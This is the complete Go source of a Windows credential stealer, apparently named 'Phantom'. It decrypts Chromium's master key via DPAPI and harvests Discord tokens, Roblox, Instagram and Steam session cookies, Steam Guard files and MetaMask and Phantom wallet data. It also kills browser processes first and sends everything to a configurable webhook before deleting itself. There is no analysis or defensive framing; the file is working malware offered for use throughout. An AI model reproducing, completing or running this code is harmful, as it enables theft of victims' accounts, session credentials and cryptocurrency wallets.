package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	crypt32           = syscall.NewLazyDLL("crypt32.dll")
	procUnprotectData = crypt32.NewProc("CryptUnprotectData")
	WebhookURL        = "CHANGEME"
	Timestamp         = "N/A"
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func CryptUnprotectData(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	var out DATA_BLOB
	input := DATA_BLOB{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}
	ret, _, err := procUnprotectData.Call(
		uintptr(unsafe.Pointer(&input)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if ret == 0 {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(out.pbData)))
	res := make([]byte, out.cbData)
	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return res, nil
}

func getMasterKey(path string) ([]byte, error) {
	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(content, &state); err != nil {
		return nil, err
	}
	decodedKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if !bytes.HasPrefix(decodedKey, []byte("DPAPI")) {
		return nil, fmt.Errorf("invalid key prefix")
	}
	return CryptUnprotectData(decodedKey[5:])
}

func decryptToken(encrypted []byte, key []byte) (string, error) {
	if len(encrypted) < 15 {
		return "", fmt.Errorf("data too short")
	}
	iv := encrypted[3:15]
	payload := encrypted[15:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	decrypted, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}
	return string(decrypted), nil
}

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type SystemReport struct {
	Username      string   `json:"username"`
	Hostname      string   `json:"hostname"`
	OS            string   `json:"os"`
	Arch          string   `json:"arch"`
	CPUs          int      `json:"num_cpu"`
	MemTotal      uint64   `json:"mem_total"`
	PublicIP      string   `json:"public_ip"`
	DiscordTokens []string `json:"discord_tokens"`
	RobloxCookies []string `json:"roblox_cookies"`
	InstaCookies  []string `json:"insta_cookies"`
	SteamCookies  []string `json:"steam_cookies"`
	SteamFiles    []string `json:"steam_files"`
	RawCookies    []Cookie `json:"raw_cookies"`
	WalletsFound  []string `json:"wallets_found"`
	Browsers      []string `json:"browsers_found"`
	Timestamp     string   `json:"timestamp"`
}

func main() {
	if WebhookURL == "" {
		return
	}

	// Ultimate mode: Close browsers first to release file locks
	closeBrowsers()
	time.Sleep(2 * time.Second)

	report := gatherEverything()
	sendReport(report)

	// Self-delete (Windows specific)
	selfDelete()
}

func closeBrowsers() {
	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
	for _, browser := range browsers {
		cmd := exec.Command("taskkill", "/F", "/IM", browser, "/T")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
}

func selfDelete() {
	if runtime.GOOS == "windows" {
		exePath, _ := os.Executable()
		cmd := fmt.Sprintf("timeout /t 3 > NUL && del /f /q \"%s\"", exePath)
		subprocess := exec.Command("cmd", "/C", cmd)
		subprocess.Start()
	} else {
		os.Remove(os.Args[0])
	}
}

func gatherEverything() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		MemTotal:  getTotalMemory(),
		PublicIP:  getPublicIP(),
		Timestamp: time.Now().Format(time.RFC3339),
	}

	report.DiscordTokens = extractDiscordTokens()
	report.RobloxCookies = extractRobloxCookies()
	report.InstaCookies = extractInstagramCookies()
	report.SteamCookies = extractSteamCookies()
	report.SteamFiles = extractSteamFiles()
	report.WalletsFound = extractWallets()
	report.Browsers = findBrowsers()

	return report
}

func extractWallets() []string {
	var found []string
	home, _ := os.UserHomeDir()

	walletExtensions := map[string]string{
		"MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":  "bfnaoagmocialkllpicneheihdpfeegk",
	}

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for browserName, basePath := range browserPaths {
		profiles := []string{"Default", "Guest Profile"}
		// Add Profile 1, Profile 2, etc.
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			for walletName, extensionID := range walletExtensions {
				// MetaMask/Phantom data is usually in "Local Extension Settings" or "Extension State"
				extPath := filepath.Join(basePath, profile, "Local Extension Settings", extensionID)
				if _, err := os.Stat(extPath); err == nil {
					zipName := fmt.Sprintf("%s_%s_%s.zip", browserName, profile, walletName)
					zipData, err := zipFolderToMemory(extPath)
					if err == nil {
						sendAsFileCustom(zipData, zipName, fmt.Sprintf("🔑 **%s Wallet Found (%s - %s)**", walletName, browserName, profile))
						found = append(found, fmt.Sprintf("%s (%s/%s)", walletName, browserName, profile))
					}
				}
			}
		}
	}

	return found
}

func zipFolderToMemory(source string) ([]byte, error) {
	buf := new(bytes.Buffer)
	w := zip.NewWriter(buf)

	err := filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		relPath, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		f, err := w.Create(relPath)
		if err != nil {
			return err
		}
		fileContent, err := os.ReadFile(path)
		if err != nil {
			return nil // Skip files we can't read
		}
		_, err = f.Write(fileContent)
		return err
	})

	w.Close()
	return buf.Bytes(), err
}

func sendAsFileCustom(data []byte, filename string, content string) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filename)
	part.Write(data)
	writer.WriteField("content", content)
	writer.Close()
	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}

func getTotalMemory() uint64 {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
		var mem uint64
		ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&mem)))
		if ret != 0 {
			return mem * 1024 // Convert KB to Bytes
		}
	}
	return 0
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"Firefox":  filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox"),
	}

	for name, path := range paths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}
	return found
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func extractDiscordTokens() []string {
	var tokens []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Discord":        filepath.Join(home, "AppData", "Roaming", "Discord"),
		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "DiscordCanary"),
		"Discord PTB":    filepath.Join(home, "AppData", "Roaming", "DiscordPTB"),
		"Google Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX":       filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	reEncrypted := regexp.MustCompile(`dQw4w9WgXcQ:([^" ]+)`)
	rePlain := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for name, baseDir := range paths {
		var masterKey []byte
		localStatePath := filepath.Join(baseDir, "Local State")
		if _, err := os.Stat(localStatePath); err == nil {
			masterKey, _ = getMasterKey(localStatePath)
		}

		// List of directories to search (Profiles for browsers, root for Discord apps)
		var searchDirs []string
		if strings.Contains(name, "Discord") || strings.HasPrefix(name, "Opera") {
			searchDirs = append(searchDirs, baseDir)
		} else {
			// Browser: search in Default and Profile X
			items, _ := os.ReadDir(baseDir)
			for _, item := range items {
				if item.IsDir() && (item.Name() == "Default" || strings.HasPrefix(item.Name(), "Profile ")) {
					searchDirs = append(searchDirs, filepath.Join(baseDir, item.Name()))
				}
			}
		}

		for _, dir := range searchDirs {
			leveldbPath := filepath.Join(dir, "Local Storage", "leveldb")
			files, err := os.ReadDir(leveldbPath)
			if err != nil {
				continue
			}

			for _, file := range files {
				if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
					continue
				}

				tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_%d", time.Now().UnixNano()))
				if err := copyFile(filepath.Join(leveldbPath, file.Name()), tempFile); err != nil {
					continue
				}
				content, err := os.ReadFile(tempFile)
				os.Remove(tempFile)
				if err != nil {
					continue
				}

				if masterKey != nil {
					matches := reEncrypted.FindAllSubmatch(content, -1)
					for _, match := range matches {
						if len(match) > 1 {
							encryptedB64 := string(match[1])
							encryptedData, err := base64.StdEncoding.DecodeString(encryptedB64)
							if err == nil {
								decrypted, err := decryptToken(encryptedData, masterKey)
								if err == nil && !contains(tokens, decrypted) {
									tokens = append(tokens, decrypted)
								}
							}
						}
					}
				}

				matchesPlain := rePlain.FindAllString(string(content), -1)
				for _, match := range matchesPlain {
					if !contains(tokens, match) {
						tokens = append(tokens, match)
					}
				}
			}
		}
	}
	return tokens
}

func extractRobloxCookies() []string {
	// Search for Roblox domain and cookie name
	return ultimateGrabber("roblox.com", ".ROBLOSECURITY")
}

func extractInstagramCookies() []string {
	// Search for Instagram domain and session cookies
	return ultimateGrabber("instagram.com", "sessionid")
}

func extractSteamCookies() []string {
	// Extraction des cookies Steam (session, login, etc.) depuis les navigateurs
	return ultimateGrabber("steampowered.com", "steamLoginSecure")
}

func extractSteamFiles() []string {
	var found []string

	// Chemins possibles de Steam sur Windows
	steamPaths := []string{
		`C:\Program Files (x86)\Steam`,
		`C:\Program Files\Steam`,
	}

	// Tenter de trouver le chemin Steam via le registre (optionnel mais plus précis)
	// Pour simplifier, on scanne les chemins standards

	for _, steamPath := range steamPaths {
		if _, err := os.Stat(steamPath); err == nil {
			// 1. Chercher les fichiers ssfn (Steam Guard)
			files, _ := os.ReadDir(steamPath)
			for _, file := range files {
				if strings.HasPrefix(file.Name(), "ssfn") {
					fullPath := filepath.Join(steamPath, file.Name())
					data, err := os.ReadFile(fullPath)
					if err == nil {
						sendAsFileCustom(data, file.Name(), "🎮 **Steam Guard File (ssfn) Captured**")
						found = append(found, file.Name())
					}
				}
			}

			// 2. Chercher le dossier config (contient loginusers.vdf, config.vdf)
			configPath := filepath.Join(steamPath, "config")
			if _, err := os.Stat(configPath); err == nil {
				zipData, err := zipFolderToMemory(configPath)
				if err == nil {
					sendAsFileCustom(zipData, "steam_config.zip", "🎮 **Steam Config Folder Captured (vdf files)**")
					found = append(found, "config folder")
				}
			}
		}
	}

	return found
}

func ultimateGrabber(domain string, targetCookie string) []string {
	var results []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, baseDir := range paths {
		localStatePath := filepath.Join(baseDir, "Local State")
		masterKey, _ := getMasterKey(localStatePath)
		if masterKey == nil {
			continue
		}

		var profileDirs []string
		items, _ := os.ReadDir(baseDir)
		for _, item := range items {
			if item.IsDir() && (item.Name() == "Default" || strings.HasPrefix(item.Name(), "Profile ")) {
				profileDirs = append(profileDirs, filepath.Join(baseDir, item.Name()))
			}
		}
		// Also check the baseDir itself for Opera
		profileDirs = append(profileDirs, baseDir)

		for _, profileDir := range profileDirs {
			cookiePaths := []string{
				filepath.Join(profileDir, "Network", "Cookies"),
				filepath.Join(profileDir, "Cookies"),
				filepath.Join(profileDir, "Web Data"),
			}

			for _, cookiePath := range cookiePaths {
				if _, err := os.Stat(cookiePath); err != nil {
					continue
				}

				tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("db_%d", time.Now().UnixNano()))
				if err := copyFile(cookiePath, tempFile); err != nil {
					continue
				}
				content, _ := os.ReadFile(tempFile)
				os.Remove(tempFile)
				if content == nil {
					continue
				}

				// Global scan for v10 tokens nearby domain or cookie name
				searchTerms := []string{domain, targetCookie, "ROBLOSECURITY", "roblox"}
				for _, term := range searchTerms {
					idx := 0
					for {
						foundIdx := strings.Index(string(content[idx:]), term)
						if foundIdx == -1 {
							break
						}
						actualIdx := idx + foundIdx
						idx = actualIdx + len(term)

						// Check a large area around the find
						start := actualIdx - 500
						if start < 0 {
							start = 0
						}
						end := actualIdx + 1500
						if end > len(content) {
							end = len(content)
						}
						searchArea := content[start:end]

						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(searchArea, -1)
						for _, v10Match := range v10Matches {
							decrypted, err := decryptToken(v10Match, masterKey)
							if err == nil && len(decrypted) > 10 {
								// Strict check for Roblox tokens
								if domain == "roblox.com" || strings.Contains(term, "ROBLO") {
									if strings.Contains(decrypted, "_|WARNING") {
										if !contains(results, decrypted) {
											results = append(results, decrypted)
										}
									}
								} else {
									// Instagram / Others
									if !contains(results, decrypted) {
										results = append(results, decrypted)
									}
								}
							}
						}
					}
				}
			}
		}
	}

	// Extra scan for plain text in all profiles
	if domain == "roblox.com" {
		rePlain := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)
		robloxPath := filepath.Join(home, "AppData", "Local", "Roblox", "LocalStorage")
		if _, err := os.Stat(robloxPath); err == nil {
			filepath.Walk(robloxPath, func(path string, info os.FileInfo, err error) error {
				if err == nil && !info.IsDir() {
					c, _ := os.ReadFile(path)
					matches := rePlain.FindAllString(string(c), -1)
					for _, m := range matches {
						if !contains(results, m) {
							results = append(results, m)
						}
					}
				}
				return nil
			})
		}
	}

	// Technique 4: Firefox Fallback
	firefoxPath := filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
	if _, err := os.Stat(firefoxPath); err == nil {
		filepath.Walk(firefoxPath, func(path string, info os.FileInfo, err error) error {
			if err == nil && (strings.Contains(path, "cookies.sqlite") || strings.Contains(path, "storage")) {
				tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("ff_%d", time.Now().UnixNano()))
				if err := copyFile(path, tempFile); err == nil {
					c, _ := os.ReadFile(tempFile)
					os.Remove(tempFile)
					if c != nil {
						if domain == "roblox.com" {
							rePlain := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)
							matches := rePlain.FindAllString(string(c), -1)
							for _, m := range matches {
								if !contains(results, m) {
									results = append(results, m)
								}
							}
						} else if domain == "instagram.com" {
							// Search for typical session lengths and characters
							idx := strings.Index(string(c), "sessionid")
							if idx != -1 {
								searchArea := string(c[idx : idx+200])
								reValue := regexp.MustCompile(`[a-zA-Z0-9_-]{32,}`)
								val := reValue.FindString(searchArea)
								if val != "" {
									if !contains(results, "sessionid="+val) {
										results = append(results, "sessionid="+val)
									}
								}
							}
						}
					}
				}
			}
			return nil
		})
	}

	return results
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func formatList(list []string, limit int) string {
	if len(list) == 0 {
		return "❌ No data found"
	}
	res := ""
	for i, item := range list {
		if i >= limit {
			res += fmt.Sprintf("\n... and %d more items", len(list)-limit)
			break
		}
		res += fmt.Sprintf("`%s` \n", item)
	}
	if len(res) > 1000 {
		return res[:997] + "..."
	}
	return res
}

func sendReport(report SystemReport) {
	// Convert full report to JSON
	jsonData, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return
	}

	// If JSON is too big for a simple message, we send it as a file
	if len(jsonData) > 1800 {
		sendAsFile(jsonData)
		return
	}

	payload := map[string]interface{}{
		"content":  "```json\n" + string(jsonData) + "\n```",
		"username": "Phantom JSON Logger",
	}

	body, _ := json.Marshal(payload)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
}

func sendAsFile(data []byte) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, _ := writer.CreateFormFile("file", "phantom_report.json")
	part.Write(data)

	writer.WriteField("content", "📦 **Phantom Report (Full JSON)**")
	writer.Close()

	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}
